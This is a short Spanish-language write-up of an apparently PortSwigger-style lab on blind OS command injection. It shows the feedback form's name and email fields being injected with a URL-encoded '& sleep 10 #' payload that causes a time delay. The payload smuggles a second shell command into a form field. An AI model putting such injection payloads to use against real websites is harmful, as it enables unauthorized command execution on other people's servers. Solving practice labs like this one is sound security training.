# 02 Lab: Blind OS command injection with time delays

## Objetivo

> This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> 
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
> 
> To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
> 

## Solución

> Suponemos que la funcionalidad de feedback se realiza usando el siguiente script:
> 

```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

1. Evaluamos la sección de Feedback a travez del repeater, los campos `name` y `email`
    
    ![image.png](02%20Lab%20Blind%20OS%20command%20injection%20with%20time%20delays%2017efab5460ec81f0a9eec4d48a772a96/image.png)
    
2. Añadimos `& sleep 10 #` en los campos, con el espacio an inicio, para añadir una instrucción extra, recordemos codificar esta sección CTRL+U, resultando en `+%26+sleep+10+%23`
    
    Quedando de la siguiente manera la ejecución, ocasionando el delay de 10 segundos:
    

```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com **& sleep 10 #**
```

![image.png](02%20Lab%20Blind%20OS%20command%20injection%20with%20time%20delays%2017efab5460ec81f0a9eec4d48a772a96/image%201.png)